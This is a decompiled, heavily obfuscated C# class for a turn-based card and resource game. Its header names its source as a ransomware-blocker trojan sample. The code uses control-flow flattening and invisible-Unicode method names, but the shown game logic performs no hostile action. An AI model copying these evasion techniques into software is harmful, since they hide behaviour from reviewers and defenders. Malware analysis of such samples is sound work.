// Decompiled with JetBrains decompiler
// Type: Cytotechnologist.Game
// Assembly: Ma, Version=2.0.4.0, Culture=neutral, PublicKeyToken=null
// MVID: 1E05311B-A9F1-497C-9B8A-F93F05B83D6B
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.02-msil\HEUR-Trojan-Ransom.MSIL.Blocker.gen-b73f14efefdd00c34646305b19167c781d2fee40a69d518a5c9000a6f01fdde4.exe

using SimpleJSON;
using System;
using System.Collections.Generic;
using System.Runtime.InteropServices;
using System.Text;

namespace Cytotechnologist
{
  public class Game
  {
    public readonly Rules Rules;
    public readonly Player[] Players;
    private readonly PlayerState[] _playerStates;
    private readonly Dice _dice;
    private List<Card> _deck;
    public readonly List<int> Winners = new List<int>();
    public readonly List<int> Losers = new List<int>();
    private int _currentPlayer = 2147483645;
    private int _currentTurn;
    private List<float> _chances;
    private readonly Random _random;
    private readonly StringBuilder _buffer;
    private bool _finished;
    private int _currentChanceIndex;

    public Game(JSONNode json, StringBuilder buffer)
    {
      this._buffer = buffer;
      this._random = Game.\u206D‮‎⁬‪‍⁮‫⁫⁬‍‬‪‍⁪⁪‮‫⁯‮⁪‍‮​⁯‎‍⁪⁫⁭⁪‍⁪‭⁭⁮‎‫‫‮((int) DateTime.Now.Ticks);
      this.Rules = Rules.Deserialize(json["rules"]);
      this._dice = new Dice();
      JSONNode jsonNode = json["players"];
      int count = jsonNode.Count;
      this.Players = new Player[count];
      for (int aIndex = 0; aIndex < count; ++aIndex)
        this.Players[aIndex] = Player.Deserialize(jsonNode[aIndex]);
      this._playerStates = new PlayerState[count];
      for (int index = 0; index < count; ++index)
        this._playerStates[index] = new PlayerState();
    }

    public bool Finished
    {
      get
      {
label_1:
        int num1 = 1701701443;
        bool finished1;
        PlayerState[] playerStates;
        int index;
        PlayerState playerState;
        bool finished2;
        bool flag;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (num1 ^ 552685425)) % 14U)
          {
            case 0:
              int num3 = flag ? 767171018 : (num3 = 1089994358);
              num1 = num3 ^ (int) num2 * -419835924;
              continue;
            case 1:
              flag = playerState.State == State.Playing;
              num1 = (int) num2 * 1104136473 ^ 1240233420;
              continue;
            case 2:
              int num4 = !finished2 ? -870814220 : (num4 = -352974488);
              num1 = num4 ^ (int) num2 * 344197394;
              continue;
            case 3:
              finished1 = false;
              num1 = (int) num2 * -1552935559 ^ -1139487618;
              continue;
            case 4:
              finished2 = this._finished;
              num1 = (int) num2 * -556032818 ^ -624781985;
              continue;
            case 5:
              playerStates = this._playerStates;
              index = 0;
              num1 = 397166610;
              continue;
            case 6:
              int num5;
              num1 = num5 = index < playerStates.Length ? 1739845973 : (num5 = 465865564);
              continue;
            case 7:
              finished1 = true;
              num1 = (int) num2 * -1389708597 ^ -1496935622;
              continue;
            case 9:
              finished1 = true;
              num1 = (int) num2 * -69315385 ^ -9842210;
              continue;
            case 10:
              goto label_1;
            case 11:
              num1 = (int) num2 * 793366567 ^ 693148426;
              continue;
            case 12:
              playerState = playerStates[index];
              num1 = 1528461950;
              continue;
            case 13:
              ++index;
              num1 = 1681328927;
              continue;
            default:
              goto label_15;
          }
        }
label_15:
        return finished1;
      }
    }

    public void ShuffleCards() => this._deck = new List<Card>((IEnumerable<Card>) this.Rules.Cards);

    public void StartNew()
    {
label_1:
      int num1 = 462436087;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ 822098290)) % 9U)
        {
          case 0:
            num1 = (int) num2 * 586192553 ^ 1451247944;
            continue;
          case 1:
            this.ShuffleCards();
            num1 = (int) num2 * 1222220919 ^ 415991294;
            continue;
          case 2:
            goto label_1;
          case 3:
            this._currentPlayer = this.Players.Length;
            num1 = (int) num2 * 942685652 ^ -1761914618;
            continue;
          case 4:
            this.Winners.Clear();
            num1 = (int) num2 * 1607223006 ^ 1954683879;
            continue;
          case 5:
            this.Losers.Clear();
            num1 = (int) num2 * -547711914 ^ -1875236722;
            continue;
          case 6:
            goto label_3;
          case 7:
            this._currentChanceIndex = -1;
            this._chances = new List<float>((IEnumerable<float>) this.Rules.RiskChances);
            num1 = (int) num2 * -491755727 ^ 948022268;
            continue;
          case 8:
            this._currentTurn = 0;
            this._finished = false;
            num1 = (int) num2 * 782494941 ^ 1648751064;
            continue;
          default:
            goto label_11;
        }
      }
label_3:
      return;
label_11:;
    }

    public void PlanningState()
    {
      int index = 0;
label_7:
      int num1 = index < this.Players.Length ? -801092354 : (num1 = -1001957796);
      Player player;
      PlayerState playerState;
      bool morePlanningSprint;
      int planningCardsCount;
      int num2;
      bool flag;
      while (true)
      {
        uint num3;
        switch ((num3 = (uint) (num1 ^ -1829363367)) % 29U)
        {
          case 0:
            int num4 = planningCardsCount != 0 ? 2096771968 : (num4 = 1361703400);
            num1 = num4 ^ (int) num3 * 1518180;
            continue;
          case 1:
            playerState.Resources -= num2 * this.Rules.OverPlanningCost;
            num1 = (int) num3 * 306286300 ^ -1663021083;
            continue;
          case 2:
            playerState.Resources = this.Rules.InitialResources;
            num1 = (int) num3 * 1787560705 ^ 611637329;
            continue;
          case 3:
            playerState.Resources -= (planningCardsCount - num2) * this.Rules.NormalPlanningCost;
            num1 = -528638808;
            continue;
          case 4:
            num1 = -124762263;
            continue;
          case 5:
            num1 = (int) num3 * -1265051553 ^ 585136384;
            continue;
          case 6:
            num1 = -801092354;
            continue;
          case 7:
            num1 = -648414846;
            continue;
          case 8:
            goto label_7;
          case 9:
            num2 = 0;
            num1 = -1573022231;
            continue;
          case 10:
            playerState.Sprint = -1;
            playerState.Resources -= num2 * this.Rules.NormalPlanningCost;
            num1 = (int) num3 * 215509181 ^ 52093422;
            continue;
          case 11:
            num1 = -2091066277;
            continue;
          case 12:
            playerState.Sprint = 0;
            num1 = (int) num3 * -2142322038 ^ -469053337;
            continue;
          case 13:
            morePlanningSprint = player.UseOneMorePlanningSprint;
            num1 = (int) num3 * -1440105378 ^ 1452940201;
            continue;
          case 14:
            num1 = (int) num3 * 1000055401 ^ 1144179484;
            continue;
          case 15:
            playerState = this._playerStates[index];
            num1 = (int) num3 * -727626202 ^ 1653810737;
            continue;
          case 16:
            goto label_3;
          case 17:
            num1 = (int) num3 * 1843892020 ^ -2101482231;
            continue;
          case 18:
            int num5 = !morePlanningSprint ? 1933877317 : (num5 = 967240965);
            num1 = num5 ^ (int) num3 * 674609309;
            continue;
          case 19:
            flag = num2 > 0;
            num1 = -572274010;
            continue;
          case 20:
            num1 = (int) num3 * -385107270 ^ -1329912655;
            continue;
          case 21:
            player = this.Players[index];
            num1 = (int) num3 * 569677328 ^ 1291390790;
            continue;
          case 22:
            playerState.Sprint = 1;
            num1 = (int) num3 * 851675097 ^ -1950260020;
            continue;
          case 23:
            ++index;
            num1 = (int) num3 * -1582441667 ^ 538138642;
            continue;
          case 24:
            planningCardsCount = player.PlanningCardsCount;
            num1 = (int) num3 * 761380756 ^ 1180385951;
            continue;
          case 25:
            int num6 = !flag ? -1726541456 : (num6 = -107909397);
            num1 = num6 ^ (int) num3 * -1683013130;
            continue;
          case 26:
            num2 = planningCardsCount - this.Rules.NormalPlanningCount;
            num1 = (int) num3 * 1219765784 ^ -1833620436;
            continue;
          case 27:
            num2 = 0;
            num1 = (int) num3 * -840359431 ^ -1774491906;
            continue;
          case 28:
            playerState.State = State.Playing;
            num1 = (int) num3 * 1343421078 ^ 1150406675;
            continue;
          default:
            goto label_31;
        }
      }
label_3:
      return;
label_31:;
    }

    public void TurnState()
    {
label_1:
      int num1 = -969840307;
      bool flag1;
      bool flag2;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ -155344700)) % 12U)
        {
          case 0:
            int num3 = flag2 ? -1109251415 : (num3 = -466849664);
            num1 = num3 ^ (int) num2 * -1841636918;
            continue;
          case 1:
            ++this._currentPlayer;
            num1 = (int) num2 * -1035683207 ^ 1237972886;
            continue;
          case 2:
            flag1 = this._currentTurn > 0;
            num1 = (int) num2 * -1536875986 ^ -1638593399;
            continue;
          case 3:
            this._currentChanceIndex = (this._currentChanceIndex + 1) % this._chances.Count;
            this.Print((object) Game.\u206F⁮‫‍⁮‎‎‪‮⁫⁭⁮⁫‫‍‌⁯‪​‪‮⁮‫⁫‏​‪⁫⁭‌⁫‌‫‫‏‍‎‮‌⁪‮("RISK CHANCE: ", this.Rules.RiskChances[this._currentChanceIndex].ToString()));
            num1 = (int) num2 * 761647956 ^ -1496997996;
            continue;
          case 4:
            this.Print((object) Game.\u206E‎⁭‬‮⁮‭​‭‎⁬‬‎⁬⁬⁮‮‬⁪⁫‭‍⁪‭‎⁮⁯‌⁭‭⁪‬‎⁯⁫‪‮‭‬‌‮("-- BEGINNING OF TURN ", (++this._currentTurn).ToString(), " --"));
            num1 = -1522004485;
            continue;
          case 5:
            this._currentPlayer = 0;
            num1 = (int) num2 * 1032885155 ^ 2097646165;
            continue;
          case 6:
            this.Print((object) "\n\nGAME STATE\n{0}\n\n-- END OF TURN {1} --\n\n", (object) this, (object) this._currentTurn);
            num1 = (int) num2 * 333781986 ^ 770815704;
            continue;
          case 7:
            goto label_1;
          case 8:
            this.PlayerTurn(this._currentPlayer);
            num1 = -2133717586;
            continue;
          case 9:
            int num4 = !flag1 ? -1404367385 : (num4 = -55423699);
            num1 = num4 ^ (int) num2 * -1923268797;
            continue;
          case 10:
            goto label_3;
          case 11:
            flag2 = this._currentPlayer >= this.Players.Length;
            num1 = (int) num2 * 2060026130 ^ -206949442;
            continue;
          default:
            goto label_14;
        }
      }
label_3:
      return;
label_14:;
    }

    private void PlayerTurn(int playerIndex)
    {
      Player player = this.Players[playerIndex];
label_1:
      int num1 = 216640895;
      while (true)
      {
        uint num2;
        Card card;
        bool flag1;
        bool flag2;
        int num3;
        bool flag3;
        bool flag4;
        int num4;
        PlayerState playerState1;
        bool flag5;
        PlayerState playerState2;
        int index;
        bool flag6;
        bool flag7;
        bool flag8;
        bool flag9;
        bool flag10;
        bool flag11;
        int num5;
        bool flag12;
        bool flag13;
        bool flag14;
        bool onlyOneWinner;
        int num6;
        switch ((num2 = (uint) (num1 ^ 2072446789)) % 93U)
        {
          case 0:
            onlyOneWinner = this.Rules.OnlyOneWinner;
            num1 = (int) num2 * 404024846 ^ -174269543;
            continue;
          case 1:
            ++playerState1.Sprint;
            num1 = (int) num2 * 1725082845 ^ 260494485;
            continue;
          case 2:
            int num7 = flag4 ? 830202522 : (num7 = 1702985669);
            num1 = num7 ^ (int) num2 * 777748195;
            continue;
          case 3:
            int num8 = onlyOneWinner ? 1074205439 : (num8 = 1191047204);
            num1 = num8 ^ (int) num2 * -1587106444;
            continue;
          case 4:
            playerState2.State = State.Lose;
            num1 = 556578016;
            continue;
          case 5:
            PlayerState playerState3 = playerState1;
            this.Print((object) Game.\u206F⁮‫‍⁮‎‎‪‮⁫⁭⁮⁫‫‍‌⁯‪​‪‮⁮‫⁫‏​‪⁫⁭‌⁫‌‫‫‏‍‎‮‌⁪‮("\t", playerState3 != null ? Game.\u202D‪⁭⁪‪‏‮‬⁫‪‭‬⁯​⁮⁪⁭⁪‭‫‫‬‬‌‪⁫⁭‮⁪‍‭‌‫‌⁫⁬‮‭⁬‮‮((object) playerState3) : (string) null));
            num1 = 1783121030;
            continue;
          case 6:
            flag2 = card.Impact < 0;
            if (!this.Rules.EconomicsAffectsAll)
            {
              num6 = 0;
              break;
            }
            num1 = (int) num2 * 1768664479 ^ 1763764331;
            continue;
          case 7:
            flag11 = !flag1;
            num1 = (int) num2 * -1688546788 ^ -2060556038;
            continue;
          case 8:
            num1 = 697298974;
            continue;
          case 9:
            this.Losers.Add(index);
            num1 = (int) num2 * 1322026901 ^ 487038565;
            continue;
          case 10:
            int num9 = flag9 ? 40635871 : (num9 = 1858202087);
            num1 = num9 ^ (int) num2 * -1484021289;
            continue;
          case 11:
            num1 = 1114939130;
            continue;
          case 12:
            this.Print((object) "CARD: {0}, {1}{2} {3} and {4}", (object) card, flag1 ? (object) "ALL " : (object) "", flag2 ? (object) "receives" : (object) "pays", (object) Game.\u202E​‬​⁭‌⁮​⁭‍‪‎⁭‎‫‍‭‭‪‮‎‪‌‭‎‬‭⁯‪‬⁮‪⁭⁮‬⁯⁭⁮⁭⁪‮(num3), flag3 ? (object) "advance" : (object) "stay");
            num1 = 1332608582;
            continue;
          case 13:
            num1 = (int) num2 * -683829167 ^ -1216372516;
            continue;
          case 14:
            num1 = (int) num2 * 7724448 ^ 239359974;
            continue;
          case 15:
            num1 = (int) num2 * -1770493102 ^ -1325102005;
            continue;
          case 16:
            num1 = 1906662659;
            continue;
          case 17:
            num1 = (int) num2 * -288360946 ^ 2121894504;
            continue;
          case 18:
            num3 = Game.\u202C‭‌⁪​⁯‭‭‬⁭‌⁬⁫‍‌‎⁪‫⁮‌⁫‍​‫‏‫​‪‫⁭‬‭‍⁮‮‪⁫‍⁫⁪‮(0, num5);
            num1 = (int) num2 * 267551820 ^ 1186234503;
            continue;
          case 19:
            int num10 = !flag11 ? 1201792980 : (num10 = 879969300);
            num1 = num10 ^ (int) num2 * -787304316;
            continue;
          case 20:
            int num11 = flag13 ? -769804034 : (num11 = -377848313);
            num1 = num11 ^ (int) num2 * 909840249;
            continue;
          case 21:
            num1 = (int) num2 * 554483985 ^ 1522459053;
            continue;
          case 22:
            flag5 = num4 < this._playerStates.Length;
            num1 = 675068813;
            continue;
          case 23:
            ++num4;
            num1 = 1771910714;
            continue;
          case 24:
            playerState1.Resources -= num3;
            num1 = (int) num2 * 441608478 ^ 1398131916;
            continue;
          case 25:
            goto label_1;
          case 26:
            playerState1.State = State.Lose;
            num1 = (int) num2 * -1074317900 ^ -2137960469;
            continue;
          case 27:
            num1 = (int) num2 * 19542725 ^ -681381349;
            continue;
          case 28:
            num1 = (int) num2 * 1035376350 ^ 1535952787;
            continue;
          case 29:
            num1 = (int) num2 * 1867453218 ^ -180972472;
            continue;
          case 30:
            int num12;
            num1 = num12 = num4 != playerIndex ? 1614171910 : (num12 = 989267097);
            continue;
          case 31:
            card = this.DrawCard();
            num1 = (int) num2 * -1587073039 ^ 56221851;
            continue;
          case 32:
            num1 = (int) num2 * -122509178 ^ 2129256330;
            continue;
          case 33:
            num5 = card.Impact - player.PlannedForCard(card.Type);
            num1 = (int) num2 * -1518474608 ^ -1272446105;
            continue;
          case 34:
            flag9 = !this.Losers.Contains(num4);
            num1 = 1446380864;
            continue;
          case 35:
            this.Print((object) Game.\u206F⁮‫‍⁮‎‎‪‮⁫⁭⁮⁫‫‍‌⁯‪​‪‮⁮‫⁫‏​‪⁫⁭‌⁫‌‫‫‏‍‎‮‌⁪‮("\nPLAYER ", playerIndex.ToString()));
            num1 = (int) num2 * -433788487 ^ -2069661156;
            continue;
          case 36:
            ++index;
            num1 = 395067034;
            continue;
          case 37:
            this.Losers.Add(playerIndex);
            num1 = (int) num2 * 1534141665 ^ 1097097889;
            continue;
          case 38:
            int num13 = flag10 ? -642087213 : (num13 = -1841769435);
            num1 = num13 ^ (int) num2 * 1415481152;
            continue;
          case 39:
            index = 0;
            num1 = 1882395893;
            continue;
          case 40:
            num1 = (int) num2 * -954796059 ^ -1561653869;
            continue;
          case 41:
            num1 = (int) num2 * -1491285724 ^ -1688272874;
            continue;
          case 42:
            int num14;
            num1 = num14 = index < this._playerStates.Length ? 1187588446 : (num14 = 539725072);
            continue;
          case 43:
            num1 = (int) num2 * 168065225 ^ -431404352;
            continue;
          case 44:
            num1 = (int) num2 * 1903957203 ^ -409757345;
            continue;
          case 45:
            this.Losers.Add(num4);
            num1 = (int) num2 * 223670618 ^ 122763454;
            continue;
          case 46:
            num1 = (int) num2 * -1958290730 ^ 1645157179;
            continue;
          case 47:
            playerState2 = this._playerStates[index];
            num1 = (int) num2 * -920631292 ^ 445350232;
            continue;
          case 48:
            this.Print((object) playerState1.State);
            num1 = (int) num2 * 1945293235 ^ 397702105;
            continue;
          case 49:
            num1 = 1528558719;
            continue;
          case 50:
            flag3 = false;
            num1 = 321015097;
            continue;
          case 51:
            num1 = (int) num2 * -120826848 ^ -2049573902;
            continue;
          case 52:
            int num15;
            num1 = num15 = flag3 ? 2050177340 : (num15 = 139718368);
            continue;
          case 53:
            playerState2.Resources -= Game.\u202C‭‌⁪​⁯‭‭‬⁭‌⁬⁫‍‌‎⁪‫⁮‌⁫‍​‫‏‫​‪‫⁭‬‭‍⁮‮‪⁫‍⁫⁪‮(0, num3 - this.Players[index].PlannedForCard(card.Type));
            num1 = (int) num2 * 1192084381 ^ -1492724237;
            continue;
          case 54:
            flag7 = playerState1.State != 0;
            num1 = (int) num2 * 1274560828 ^ 1635721036;
            continue;
          case 55:
            num1 = (int) num2 * -1791316764 ^ 526075756;
            continue;
          case 56:
            int num16 = playerState1.Resources >= 0 ? -1701204020 : (num16 = -1513608173);
            num1 = num16 ^ (int) num2 * 1712356889;
            continue;
          case 57:
            flag3 = true;
            num1 = (int) num2 * 162295960 ^ 293478594;
            continue;
          case 58:
            int num17 = flag5 ? -1949875657 : (num17 = -1138172867);
            num1 = num17 ^ (int) num2 * -1541340382;
            continue;
          case 59:
            num3 = card.Impact;
            num1 = (int) num2 * -193427418 ^ 673255064;
            continue;
          case 60:
            int num18 = !flag8 ? -1897606817 : (num18 = -1883730909);
            num1 = num18 ^ (int) num2 * -31774885;
            continue;
          case 61:
            num6 = card.Type == 4 ? 1 : 0;
            break;
          case 62:
            flag8 = !this.Losers.Contains(index);
            num1 = (int) num2 * 126496112 ^ 685073018;
            continue;
          case 63:
            this.Winners.Add(playerIndex);
            num1 = (int) num2 * -378775171 ^ -49501378;
            continue;
          case 64:
            playerState1.State = State.Won;
            num1 = (int) num2 * -1374733652 ^ 682141927;
            continue;
          case 65:
            num1 = 1706365116;
            continue;
          case 66:
            flag6 = playerState1.Sprint < 0;
            num1 = 1467768734;
            continue;
          case 67:
            this._finished = true;
            num1 = (int) num2 * -2135467803 ^ 1958762010;
            continue;
          case 68:
            flag12 = playerState2.Resources >= 0;
            num1 = (int) num2 * -1838135320 ^ 1390143966;
            continue;
          case 69:
            flag14 = !this._dice.Roll(this._chances[this._currentChanceIndex]);
            num1 = 1870713051;
            continue;
          case 70:
            playerState1 = this._playerStates[playerIndex];
            num1 = (int) num2 * 309346210 ^ 583976346;
            continue;
          case 71:
            num4 = 0;
            num1 = (int) num2 * -724088923 ^ 950010174;
            continue;
          case 72:
            num1 = (int) num2 * 1483999980 ^ -1064150846;
            continue;
          case 73:
            int num19 = !flag14 ? -842498770 : (num19 = -1037799565);
            num1 = num19 ^ (int) num2 * -787472724;
            continue;
          case 74:
            num1 = 582373324;
            continue;
          case 75:
            num1 = (int) num2 * 1407688199 ^ 1115517343;
            continue;
          case 76:
            flag3 = num5 < this.Rules.StayOnSprintMinDiff;
            num1 = (int) num2 * 682781377 ^ 717771079;
            continue;
          case 77:
            flag4 = playerState1.Sprint > this.Rules.SprintCount;
            num1 = 2145718684;
            continue;
          case 78:
            num1 = (int) num2 * -2062263646 ^ 1110276442;
            continue;
          case 79:
            flag3 = true;
            this.Print((object) "CARD: none, advance");
            num1 = (int) num2 * -577900493 ^ 1633892666;
            continue;
          case 80:
            num1 = 1812242548;
            continue;
          case 81:
            int num20 = flag7 ? 1661861543 : (num20 = 735928624);
            num1 = num20 ^ (int) num2 * -1602011118;
            continue;
          case 82:
            num1 = (int) num2 * -1643947977 ^ 562883262;
            continue;
          case 83:
            int num21 = flag6 ? -878251435 : (num21 = -866178287);
            num1 = num21 ^ (int) num2 * -1145085928;
            continue;
          case 84:
            goto label_3;
          case 85:
            int num22 = flag12 ? -267972398 : (num22 = -1139352177);
            num1 = num22 ^ (int) num2 * -777549737;
            continue;
          case 86:
            num1 = (int) num2 * 1814619164 ^ 1319577685;
            continue;
          case 87:
            num1 = 584937390;
            continue;
          case 88:
            flag13 = !this.Losers.Contains(playerIndex);
            num1 = (int) num2 * 1898749501 ^ 1627550708;
            continue;
          case 89:
            num1 = (int) num2 * -692972608 ^ -479663462;
            continue;
          case 90:
            ++playerState1.Sprint;
            this.Print((object) "Still planning");
            num1 = (int) num2 * 1333383842 ^ 1857671322;
            continue;
          case 91:
            num1 = (int) num2 * 1793636973 ^ 127436869;
            continue;
          case 92:
            num1 = (int) num2 * 1112455622 ^ 1362145182;
            continue;
          default:
            goto label_98;
        }
        flag1 = num6 != 0;
        flag10 = !flag2;
        num1 = 1617179788;
      }
label_3:
      return;
label_98:;
    }

    private Card DrawCard()
    {
label_1:
      int num1 = -1388189503;
      Card card1;
      bool flag;
      Card card2;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ -532216512)) % 8U)
        {
          case 0:
            int num3 = flag ? 112663684 : (num3 = 2047177631);
            num1 = num3 ^ (int) num2 * -1662125580;
            continue;
          case 1:
            flag = this._deck.Count <= 0;
            num1 = (int) num2 * -1568277954 ^ -656749682;
            continue;
          case 2:
            card2 = card1;
            num1 = (int) num2 * -884310601 ^ 1901065091;
            continue;
          case 3:
            num1 = (int) num2 * -206488177 ^ -736137753;
            continue;
          case 4:
            this.ShuffleCards();
            num1 = (int) num2 * -534824436 ^ 1246416751;
            continue;
          case 6:
            goto label_1;
          case 7:
            card1 = this._deck[0];
            this._deck.RemoveAt(0);
            num1 = -1181479581;
            continue;
          default:
            goto label_9;
        }
      }
label_9:
      return card2;
    }

    public string ToString(bool initial)
    {
label_1:
      int num1 = -505425132;
      int index;
      string str1;
      string str2;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ -679960993)) % 8U)
        {
          case 0:
            ++index;
            num1 = (int) num2 * 1296542288 ^ -608462872;
            continue;
          case 2:
            string[] strArray = new string[5]
            {
              str1,
              index.ToString(),
              ": ",
              null,
              null
            };
            PlayerState playerState = this._playerStates[index];
            strArray[3] = playerState != null ? Game.\u202D‪⁭⁪‪‏‮‬⁫‪‭‬⁯​⁮⁪⁭⁪‭‫‫‬‬‌‪⁫⁭‮⁪‍‭‌‫‌⁫⁬‮‭⁬‮‮((object) playerState) : (string) null;
            strArray[4] = "\n";
            str1 = Game.\u206A⁯‫‌‮⁫‬‍‌⁬⁭‎​‌‬⁬‎‮⁯‍⁮​‭‍⁫⁯‫‭‏‍‮‏‪⁫‌‫⁬⁯‫‪‮(strArray);
            num1 = -338438785;
            continue;
          case 3:
            str1 = "";
            index = 0;
            num1 = (int) num2 * -532929947 ^ 1018765326;
            continue;
          case 4:
            goto label_1;
          case 5:
            str2 = str1;
            num1 = (int) num2 * -1753013046 ^ -1303172220;
            continue;
          case 6:
            num1 = (int) num2 * 1900360598 ^ 1891332076;
            continue;
          case 7:
            int num3;
            num1 = num3 = index < this._playerStates.Length ? -1468822555 : (num3 = -1767572998);
            continue;
          default:
            goto label_9;
        }
      }
label_9:
      return str2;
    }

    public override string ToString()
    {
label_1:
      int num1 = -884904965;
      string str;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ -1669301951)) % 3U)
        {
          case 0:
            goto label_1;
          case 1:
            str = this.ToString(false);
            num1 = (int) num2 * 2106301541 ^ -1810064371;
            continue;
          default:
            goto label_4;
        }
      }
label_4:
      return str;
    }

    private void Print(object text, params object[] more) => Game.\u206E⁫‎‭⁪‫⁪‫‫​‭‏‏⁮⁪⁫‭⁫‌‍‍⁭‬‎‫‬⁭​⁭‏​⁯‬⁪‬⁯‭⁯‮‍‮(this._buffer, Game.\u206C⁫‍⁯‍⁬‍⁮‪‍‏⁫‭⁯‫‌‎⁮‪‬⁭‬⁯‮‬‌⁫‪‬⁫​⁯​‮‮‎⁬⁮‪⁫‮(Game.\u202D‪⁭⁪‪‏‮‬⁫‪‭‬⁯​⁮⁪⁭⁪‭‫‫‬‬‌‪⁫⁭‮⁪‍‭‌‫‌⁫⁬‮‭⁬‮‮(text), more));

    static Random \u206D‮‎⁬‪‍⁮‫⁫⁬‍‬‪‍⁪⁪‮‫⁯‮⁪‍‮​⁯‎‍⁪⁫⁭⁪‍⁪‭⁭⁮‎‫‫‮([In] int obj0) => new Random(obj0);

    static string \u206E‎⁭‬‮⁮‭​‭‎⁬‬‎⁬⁬⁮‮‬⁪⁫‭‍⁪‭‎⁮⁯‌⁭‭⁪‬‎⁯⁫‪‮‭‬‌‮(
      [In] string obj0,
      [In] string obj1,
      [In] string obj2)
    {
      return obj0 + obj1 + obj2;
    }

    static string \u206F⁮‫‍⁮‎‎‪‮⁫⁭⁮⁫‫‍‌⁯‪​‪‮⁮‫⁫‏​‪⁫⁭‌⁫‌‫‫‏‍‎‮‌⁪‮([In] string obj0, [In] string obj1) => obj0 + obj1;

    static int \u202C‭‌⁪​⁯‭‭‬⁭‌⁬⁫‍‌‎⁪‫⁮‌⁫‍​‫‏‫​‪‫⁭‬‭‍⁮‮‪⁫‍⁫⁪‮([In] int obj0, [In] int obj1) => Math.Max(obj0, obj1);

    static int \u202E​‬​⁭‌⁮​⁭‍‪‎⁭‎‫‍‭‭‪‮‎‪‌‭‎‬‭⁯‪‬⁮‪⁭⁮‬⁯⁭⁮⁭⁪‮([In] int obj0) => Math.Abs(obj0);

    static string \u202D‪⁭⁪‪‏‮‬⁫‪‭‬⁯​⁮⁪⁭⁪‭‫‫‬‬‌‪⁫⁭‮⁪‍‭‌‫‌⁫⁬‮‭⁬‮‮([In] object obj0) => obj0.ToString();

    static string \u206A⁯‫‌‮⁫‬‍‌⁬⁭‎​‌‬⁬‎‮⁯‍⁮​‭‍⁫⁯‫‭‏‍‮‏‪⁫‌‫⁬⁯‫‪‮([In] string[] obj0) => string.Concat(obj0);

    static string \u206C⁫‍⁯‍⁬‍⁮‪‍‏⁫‭⁯‫‌‎⁮‪‬⁭‬⁯‮‬‌⁫‪‬⁫​⁯​‮‮‎⁬⁮‪⁫‮([In] string obj0, [In] object[] obj1) => string.Format(obj0, obj1);

    static StringBuilder \u206E⁫‎‭⁪‫⁪‫‫​‭‏‏⁮⁪⁫‭⁫‌‍‍⁭‬‎‫‬⁭​⁭‏​⁯‬⁪‬⁯‭⁯‮‍‮(
      [In] StringBuilder obj0,
      [In] string obj1)
    {
      return obj0.AppendLine(obj1);
    }
  }
}
